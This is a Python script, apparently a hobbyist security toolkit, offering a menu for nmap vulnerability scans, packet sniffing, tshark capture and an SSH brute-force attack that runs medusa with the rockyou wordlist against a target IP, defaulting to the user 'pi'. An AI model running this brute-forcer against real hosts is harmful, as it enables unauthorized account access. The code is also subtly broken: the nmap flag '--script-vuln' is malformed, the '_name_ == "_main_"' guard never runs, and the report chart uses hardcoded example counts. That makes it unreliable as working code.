import subprocess
import signal
import sys
import os
import time
from datetime import datetime
import matplotlib.pyplot as plt

# Global variables
report_file = None
start_time = None

# Function to log and save output to a file
def log_and_save(message):
    print(message)  # Display on screen
    with open(report_file, "a") as report:
        report.write(message + "\n")  # Save to file

# Handle Ctrl+C (SIGINT) to save progress before exiting
def signal_handler(sig, frame):
    end_time = time.time()
    duration = round(end_time - start_time, 2)

    log_and_save("\n[!] Traffic capture interrupted. Report saved.")
    log_and_save(f"Total Time Elapsed: {duration} seconds\n")

    sys.exit(0)

# Attach signal handler
signal.signal(signal.SIGINT, signal_handler)

def save_report(task_name, content):
    """Saves the report to the reports directory with a timestamp."""
    os.makedirs("reports", exist_ok=True)
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"reports/{task_name}_{timestamp}.txt"
    with open(filename, "w") as f:
        f.write(content)
    print(f"Report saved: {filename}\n")

def vulnerability_scan(target):
    if not target:
        print("Error: Enter a valid IP address")
        return

    print("\nStarting Vulnerability Scan...\n")
    start_time = time.time()
    result = subprocess.run(['nmap', "-sV", "--script-vuln", target], capture_output=True, text=True)
    duration = time.time() - start_time
    output = f"Scan Results:\n{result.stdout if result.stdout else 'No vulnerabilities found.'}\n\nTime Taken: {duration:.2f} seconds"
    print(output)
    save_report("Vulnerability_Scan", output)

def penetration_test(target):
    if not target:
        print("Error: Enter a valid IP address")
        return

    print("\nStarting Sniffing Attack (Penetration Test)...\n")
    start_time = time.time()
    result = subprocess.run(['tcpdump', "-i", "any", "-c", "10"], capture_output=True, text=True)
    duration = time.time() - start_time
    output = f"Penetration Test Output:\n{result.stdout}\n\nTime Taken: {duration:.2f} seconds"
    print(output)
    save_report("Penetration_Test", output)

def digital_forensics():
    """Captures and analyzes network traffic in real-time using tshark and saves a report."""
    global report_file, start_time
    
    print("\nCapturing Network Traffic (Forensics)...\n")
    start_time = time.time()

    # Define hazardous ports & protocols
    hazardous_ports = {22, 23, 25, 53, 135, 139, 445, 3389}
    hazardous_protocols = {"malware", "botnet", "trojan", "exploit", "icmp"}

    # Ensure "reports" directory exists
    report_dir = "reports"
    os.makedirs(report_dir, exist_ok=True)

    # Generate a timestamped report file inside "reports"
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    report_file = os.path.join(report_dir, f"forensics_report_{timestamp}.txt")

    print(f"[+] Saving results to: {report_file}\n")

    # Start real-time tshark capture (100 packets)
    tshark_cmd = [
        "tshark", "-i", "wlan0", "-c", "100",
        "-T", "fields",
        "-e", "frame.number",
        "-e", "ip.src",
        "-e", "ip.dst",
        "-e", "tcp.srcport",
        "-e", "tcp.dstport",
        "-e", "udp.srcport",
        "-e", "udp.dstport",
        "-e", "frame.protocols"
    ]

    try:
        with open(report_file, "w") as report:
            tshark_process = subprocess.Popen(
                tshark_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )

            # Process each packet as soon as it arrives
            for line in iter(tshark_process.stdout.readline, ''):
                if not line.strip():
                    continue  # Ignore empty lines

                parts = line.strip().split("\t")
                if len(parts) < 3:
                    continue  # Skip malformed packets

                frame_no, src_ip, dst_ip = parts[:3]
                src_port = parts[3] if len(parts) > 3 else "N/A"
                dst_port = parts[4] if len(parts) > 4 else "N/A"
                protocol = parts[7] if len(parts) > 7 else "Unknown"

                # Check if packet has hazardous elements
                hazard = []
                is_suspicious = False

                if src_port.isdigit() and int(src_port) in hazardous_ports:
                    hazard.append(f"Suspicious Source Port {src_port}")
                    is_suspicious = True

                if dst_port.isdigit() and int(dst_port) in hazardous_ports:
                    hazard.append(f"Suspicious Destination Port {dst_port}")
                    is_suspicious = True

                if any(proto in protocol.lower() for proto in hazardous_protocols):
                    hazard.append(f"Suspicious Protocol Detected: {protocol}")
                    is_suspicious = True

                # Prepare log entry
                log_entry = (
                    f"\nPacket #{frame_no}\n"
                    f"• Source: {src_ip}:{src_port}\n"
                    f"• Destination: {dst_ip}:{dst_port}\n"
                    f"• Protocol: {protocol}\n"
                )

                if is_suspicious:
                    log_entry += f"! HAZARD DETECTED: {', '.join(hazard)}\n"
                else:
                    log_entry += "Normal Packet (No Threats Detected)\n"
                
                log_entry += "-" * 50 + "\n"

                # Print to console in real-time
                print(log_entry)

                # Save to report file in real-time
                report.write(log_entry)
                report.flush()  # Ensure data is saved immediately

    except KeyboardInterrupt:
        print("\nCapture interrupted by user. Report saved.")
    except Exception as e:
        print(f"\nX Error: {str(e)}")

    print(f"\n[+] Forensics capture complete. Report saved at {report_file}\n")

def brute_force(target_ip, username="pi", wordlist="/usr/share/wordlists/rockyou.txt"):
    global report_file, start_time
    
    # Create report directory if not exists
    report_dir = "reports"
    os.makedirs(report_dir, exist_ok=True)

    # Create report file with timestamp
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    report_file = os.path.join(report_dir, f"brute_force_{timestamp}.txt")

    print(f"[+] Saving results to: {report_file}\n")

    with open(wordlist, "r", encoding="latin-1") as f, open(report_file, "w") as report:
        passwords = f.readlines()
        total = len(passwords)
        print(f"[+] Loaded {total} passwords for cracking...\n")

        for idx, password in enumerate(passwords, start=1):
            password = password.strip()
            print(f"[+] Trying {idx}/{total}: {password}")
            # Write progress to the report file
            report.write(f"Attempt {idx}: {password}\n")
            report.flush()  # Ensure it saves instantly

            # Run Medusa
            cmd = [
                "medusa", "-h", target_ip, "-u", username,
                "-p", password, "-M", "ssh", "-t", "16"
            ]

            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

            # Check if password is found
            if "SUCCESS" in result.stdout:
                print(f"\n[+] Password Found: {password}\n")
                report.write(f"\n[+] Password Found: {password}\n")
                report.flush()
                break  # Stop attack after finding the password

    print(f"\n[+] Brute-force complete. Report saved at {report_file}")

def generate_report():
    print("\nGenerating Security Report...\n")
    vuln_count = 5  # Example counts
    pentest_count = 3
    brute_count = 8
    labels = ['Vulnerabilities', 'Penetration Tests', 'Brute Force Attempts']
    values = [vuln_count, pentest_count, brute_count]
    plt.figure(figsize=(6, 4))
    plt.bar(labels, values, color=['red', 'blue', 'green'])
    plt.title("Security Analysis Report")
    plt.show()
    print("\nReport Generated Successfully!\n")

def view_reports():
    print("\nAvailable Reports:\n")
    reports = os.listdir("reports")
    if not reports:
        print("No reports found.\n")
        return
    
    for idx, report in enumerate(reports, 1):
        print(f"{idx}. {report}")
    
    choice = input("Enter report number to view (or press Enter to go back): ")
    if choice.isdigit() and 1 <= int(choice) <= len(reports):
        report_file = reports[int(choice) - 1]
        with open(f"reports/{report_file}", "r") as f:
            print("\nReport Content:\n")
            print(f.read())
    else:
        print("Invalid choice or no selection.\n")

def main():
    target_ip = input("Enter Target IP: ")
    while True:
        print("\nSelect an option:")
        print("1. Vulnerability Scan")
        print("2. Brute Force Attack")
        print("3. Capture Traffic (Forensics)")
        print("4. View Reports")
        print("5. Exit")

        choice = input("Enter your choice: ")
        if choice == '1':
            vulnerability_scan(target_ip)
        elif choice == '2':
            brute_force(target_ip)
        elif choice == '3':
            digital_forensics()
        elif choice == '4':
            view_reports()
        elif choice == '5':
            print("Exiting...\n")
            break
        else:
            print("Invalid choice! Please enter a number between 1-5.")

if _name_ == "_main_":
    main()
